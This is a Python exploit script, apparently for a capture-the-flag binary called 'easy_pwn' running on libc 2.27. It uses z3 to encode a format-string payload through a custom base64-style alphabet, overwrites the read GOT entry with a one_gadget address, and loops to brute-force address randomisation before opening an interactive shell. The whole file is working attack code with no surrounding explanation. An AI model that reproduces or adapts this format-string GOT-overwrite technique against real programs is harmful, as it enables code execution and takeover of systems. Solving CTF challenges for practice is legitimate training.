from re import M
from z3 import *
from pwn import *
from LibcSearcher import *

destring='7M9BXCGPswHRFxvbdaNgyVilEmpD/foYhTznK6Lkj5A+t3W20reUZO18QcSqJI4u'
def de(aa,bb,cc):
    a=Int('a')
    b=Int('b')
    c=Int('c')
    d=Int('d')
    s=Solver()
    # print('here')
    s.add(a>=0 , a < 64)
    s.add(b>=0 , b < 64)
    s.add(c>=0 , c < 64)
    s.add(d>=0 , d < 64)
    s.add(aa==(4*a+(b-b%16)/16)%256)
    s.add((16*b+ (c-c%4)/4)%256==bb)
    s.add(cc==(d+64*c)%256)
    print(s.check())
    print(s.model())
    m=s.model()
    # print(m['a'])
    # print(m['a'].as_long(),m['b'].as_long(),m['c'].as_long(),m['d'].as_long())
    # print(m[a])
    # # print((chr(m[a])+chr(m[b])+chr(m[c])+chr(m[d])).encode())
    # print(m[a],m[b],m[c],m[d])
    return m.eval(a),m.eval(b),m.eval(c),m.eval(d)
def realpayload(payload):
    payload=payload.ljust(len(payload)+len(payload)%3,b'a').decode()
    print(payload)
    ans=b''
    for i in range(len(payload)//3):
        print(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        m=de(ord(payload[3*i]),ord(payload[3*i+1]),ord(payload[3*i+2]))
        # print(m[0].as_long(),m[1].as_long(),m[2].as_long(),m[3].as_long())
        ans+=destring[m[0].as_long()].encode()+destring[m[1].as_long()].encode()+destring[m[2].as_long()].encode()+destring[m[3].as_long()].encode()
    # print(ans)
    return ans
    
def findloc(c):
    return destring.find(c)

for i in range(16):
    context.log_level = 'debug' 
    p=process('./easy_pwn')
    # p=remote('t.ctf.qwq.cc',49241)
    elf=ELF('./easy_pwn')
    libc=ELF('./libc-2.27.so')
    p.recvuntil(b'tell me your name\n')
    setbuf_got=elf.got['setbuf']
    read_got=elf.got['read']
    printfaddr=0x064E80
    execve=0x4f2c5
    # 0x4f322
    # 0x10a38c
    # read_got 12
    first=4+16*i
    second=0xf322-first
    payload=b'%'+str(first).encode()+b'c%13$hhn%'+str(second).encode()+b'c%12$hn'
    realpay=realpayload(payload)
    pause()
    p.sendline(realpay.ljust(0x20,b'\x00')+p64(read_got)+p64(read_got+2))
    # print(p.recvuntil(b'dd'))
    p.recvuntil(b'this is a gift for you\n')

    # p.interactive()
    p.interactive()